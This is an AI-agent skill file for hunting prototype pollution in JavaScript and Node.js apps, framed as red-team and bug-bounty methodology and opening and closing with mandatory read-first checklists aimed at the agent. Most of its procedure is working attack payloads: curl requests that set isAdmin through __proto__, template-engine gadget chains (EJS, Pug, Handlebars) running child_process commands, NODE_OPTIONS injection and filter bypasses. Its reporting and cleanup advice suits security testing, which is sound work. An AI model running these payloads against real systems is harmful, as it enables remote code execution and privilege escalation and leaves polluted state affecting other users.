---
name: hunt-prototype-pollution
description: Hunt client-side and server-side prototype pollution for XSS, auth bypass, and RCE.
category: redteam
version: 1.2.0
revision_date: 2026-10-16
license: MIT
platforms: [linux, macos]
compatibility: Requires curl, python3
tags: [redteam, prototype-pollution, XSS, RCE, JavaScript, Node.js, jQuery]
related_skills:
  - hunt-nodejs
  - hunt-xss
  - hunt-api-misconfig
---


## MANDATORY ON INVOCATION

Some harnesses read only the first ~150 lines of this skill when it is triggered. The table below is the mandatory part of this skill — it applies the moment this skill is invoked, before any other tool call.

| # | Requirement | Action |
|---|---|---|
| 1 | Full read | Read the ENTIRE SKILL.md, including everything past this table, before starting any work |
| 2 | Bundled files | None shipped — this SKILL.md is self-contained |
| 3 | Stop condition | Do not run a single hunting/scanning/exploit command until items 1-2 are done |

Markdown checklist (duplicate this check in your working notes):

- [ ] Full SKILL.md read end to end before the first tool call
- [ ] Protocol confirmed before any work started

# Prototype Pollution Hunting

Hunt for prototype pollution vulnerabilities where user-supplied properties merge into `Object.prototype`, affecting all objects in the runtime. Client-side pollution enables DOM XSS, cookie manipulation, and auth bypass. Server-side pollution chains to RCE via gadget chains in template engines (EJS, Pug, Handlebars) and CLI wrappers (child_process, NODE_OPTIONS).

## When to Use

- Application uses JavaScript/Node.js with object merge, clone, or extend operations on user input.
- jQuery `$.extend(true, ...)` or `$.fn.merge()` with deep copy on untrusted data.
- Lodash `_.merge()`, `_.defaultsDeep()`, `_.set()` receiving request body/query params.
- Template engines (EJS, Pug, Handlebars) in the same runtime as user-controlled objects.
- Server-side Node.js with `child_process.exec`/`spawn` accessible via polluted options.

## Quick Detection

```bash
# client-side: pollute via query param
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page?__proto__[polluted]=true"

# server-side: pollute via JSON body
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

## Procedure

### Phase 1 — Client-Side Pollution Vectors

```bash
# URL query string
https://target.com/?__proto__[test]=polluted
https://target.com/?constructor[prototype][test]=polluted

# JSON body in API
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'

# Form-encoded
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/form" \
  -d '__proto__[polluted]=true'

# Via Object.assign / spread in request handlers
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

### Phase 1b — Confirm server-side pollution without a browser console

Server-side you have no `Object.prototype.polluted` to read, so a `200 OK` on the injection request
proves **nothing**. The only question that matters: did the property land on the *prototype* (global,
affects later requests) or merely on *this request's* object (mass assignment, a different and much
weaker finding)?

**The discriminator is cross-request persistence.** Pollute on one endpoint, then read an *unrelated*
endpoint that returns a JSON object. If the canary appears on an object that never received your
input, the prototype is polluted.

```bash
# 1. pollute with a canary name nothing else would ever use
curl --max-time 30 -sk -X POST "https://target.com/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"zzcanary7f3":"pp-probe"}}'

# 2. read a DIFFERENT endpoint — do not re-send the polluted body
curl --max-time 30 -sk "https://target.com/api/profile" | grep -o 'zzcanary7f3'
# canary present on an unrelated object => Object.prototype is polluted
```

Pick a canary that is an unused-but-plausible property name, and keep it unique per test so a hit is
unambiguous. If no endpoint echoes unknown properties, fall back to a **behavioural** canary — pollute
a property the framework or a library reads and watch for a response-shape change (an altered status,
a changed error body, a header that appears). Behaviour change on a request that did not carry your
payload is the same proof.

**Worker scoping will fake a negative.** Node behind cluster/PM2/multiple containers pollutes only the
worker that served the injection. The next request may land on a clean worker and read as "not
vulnerable". Re-send the read several times, or pin the connection with keep-alive
(`curl -H 'Connection: keep-alive'` against the same socket), before concluding anything. Conversely,
the canary vanishing later usually means a restart or a different worker — not that you were wrong.

**Pollution is in-memory and sticky.** It survives until that worker restarts, and it affects *other
users* served by that worker. That makes it both the proof and a live side effect you are responsible
for — see Documenting the finding.

### Phase 2 — Server-Side RCE via Gadget Chains

**EJS RCE (outputFunctionName):**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/render" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require(\"child_process\").execSync(\"id\");"}}'
```

**Pug RCE (self.block):**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/preferences" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"id\")"}}}'
```

**Handlebars RCE (compileFunction):**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"precompileOptions":{"knownHelpersOnly":false,"compat":true},"compileFunction":"return process.mainModule.require(\"child_process\").execSync(\"id\").toString();"}}'
```

**NODE_OPTIONS injection:**
```bash
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/task" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","shell":"/bin/sh","env":{"NODE_DEBUG":"test"}}}'
```

### Phase 3 — Filter Bypass Techniques

```bash
# Unicode normalization (e.g., ä → a)
https://target.com/?__proto__[test]=1         # blocked
https://target.com/?__pröto__[test]=1         # bypass (ä normalizes to a)

# constructor.prototype path
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/data" \
  -d '{"constructor":{"prototype":{"polluted":true}}}'

# Array pollution (lodash specific)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/data" \
  -d '{"__proto__":{"polluted":[]}}'  # forces array coercion

# ppfuzz — automated prototype pollution scanner
ppfuzz -u https://target.com/api/merge -m POST -H "Content-Type: application/json"
```

### Phase 4 — Client-Side Exploitation

```javascript
// Verify pollution in browser console
Object.prototype.polluted  // should return the injected value

// DOM XSS via polluted options
// If the app uses jQuery $.extend with polluted {url: "javascript:alert(1)"}

// Auth bypass: pollute isAdmin
// If the app checks if (user.isAdmin) without hasOwnProperty
```

### Phase 5 — Second-Order Pollution

```bash
# Store pollution in database, triggered by background job
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":{"__proto__":{"isAdmin":true}}}'

# Later, when an admin views the profile or a cron job processes it,
# the pollution triggers in that context
```

## Documenting the finding

Prototype pollution gets closed as informational more often than almost any other class, because the
report shows an injection and not a consequence. Give the triager these, in this order:

1. **The polluting request, verbatim** — method, path, `Content-Type`, full body. The content type
   matters: a JSON-body merge and a query-string merge are different code paths and different fixes.
2. **Which property chain was required** — `__proto__` vs `constructor.prototype` vs a Unicode or
   nesting bypass. This tells the developer exactly what their existing filter failed to catch; if a
   naive `__proto__` key was blocked and `constructor.prototype` worked, say so explicitly.
3. **The merge sink** — library, function and version (`lodash.merge` 4.17.x, `$.extend(true, …)`,
   or an app-specific recursive merge with its file/line if you found it in a bundle). Without this
   the fix is guesswork.
4. **Proof of global persistence** — the *second*, unrelated request and its response showing the
   canary. This is the single piece most reports omit and the one that separates prototype pollution
   from mass assignment. Include both requests, in order, with timestamps.
5. **The consuming sink** — where the polluted property is actually read: the privilege check
   (`if (user.isAdmin)` with no `hasOwnProperty`), the template option, the `child_process` option
   object, the DOM sink. Pollution with no consumer is a hardening note, not a vulnerability.
6. **Observed impact, not inferred impact** — what you actually saw change. "Reached an admin-only
   endpoint as a standard user, response attached" beats "could allow privilege escalation."
7. **Blast radius and lifetime** — worker-scoped or process-wide, how many workers you observed, and
   that the state persists until restart. State plainly that other users served by that worker were
   affected during the window.
8. **Cleanup** — name the canary property you set, confirm you did not pollute anything
   destructive, and recommend a worker restart. Do this even when the canary looks harmless; the
   operator needs to know the runtime is dirty.

**Severity, calibrated honestly:**

| What you proved | Band |
|---|---|
| Canary persists globally, no consumer found | Low / Informational |
| Polluted property read by a non-security code path (rendering, config) | Low / Medium |
| DoS — worker crash or hang via a polluted core property | Medium / High, and only if the program accepts DoS |
| Auth or privilege check bypassed, demonstrated on a real endpoint | High / Critical |
| RCE via a template or `child_process` gadget, command output shown | Critical |

Client-side pollution follows the same ladder but the consumer is a DOM sink, and the proof must be
script execution in another user's context — a polluted property alone is not XSS.

## Pitfalls

- **Not every `__proto__` in a request is a finding.** Only report when the polluted property actually affects application behavior.
- **A 200 OK on the injection is not confirmation.** Most merge endpoints accept and silently discard unknown keys. Without the cross-request canary (Phase 1b) you have not distinguished prototype pollution from mass assignment — and mass assignment is a different report with a different fix.
- **Load-balanced workers produce false negatives.** A clean read after a successful pollution usually means a different worker answered, not that the pollution failed. Repeat before concluding.
- **DoS canaries are destructive.** Polluting a property that core libraries read (`length`, `then`, `toString`) can hang or crash the worker for every user on it. Do not use these as a first probe, and never on production without explicit authorization to test availability.
- **You are leaving state behind.** Unlike most web classes, a successful proof mutates the running process for other users until restart. Keep canaries inert and uniquely named, and disclose them.
- **Node.js 12+ and newer lodash versions have partial mitigations.** Test with older versions first.
- **`Object.create(null)`, `Map`, and frozen prototypes defeat this entirely** — a negative on such an endpoint is a correct negative, not a missed bypass.
- **Server-side pollution requires a gadget.** Polluting random objects without reaching a sink (exec, eval, template) has no impact.
- **BlackFan's client-side prototype pollution catalog** is the canonical reference — cross-check findings against it.

## Verification

1. Inject `__proto__[test]=value` and verify `Object.prototype.test === value` in browser console or server response.
2. For RCE: confirm command execution produces output (id/whoami) in a visible sink.
3. For XSS: verify the polluted property reaches `innerHTML`, `eval`, `document.write`, or a script `src` attribute.
4. Document the exact merge/copy function and the polluted property chain.

## Related Skills

- **`hunt-nodejs`** — Node.js-specific vulnerabilities including prototype pollution in Express/Next.js.
- **`hunt-xss`** — DOM XSS often exploitable through client-side prototype pollution.
- **`hunt-api-misconfig`** — Object merge on request bodies without `hasOwnProperty` checks.

## MANDATORY ON INVOCATION — PROTOCOL RESTATMENT (END OF FILE)

You have reached the end of this SKILL.md. The invocation protocol below is identical to the one at the top of this file. If you are reading this, the full skill context is loaded — confirm the checklist.

| # | Requirement | Action |
|---|---|---|
| 1 | Full read | Read the ENTIRE SKILL.md, including everything past this table, before starting any work |
| 2 | Bundled files | None shipped — this SKILL.md is self-contained |
| 3 | Stop condition | Do not run a single hunting/scanning/exploit command until items 1-2 are done |

Markdown checklist (duplicate this check in your working notes):

- [ ] Full SKILL.md read end to end before the first tool call
- [ ] Protocol confirmed before any work started
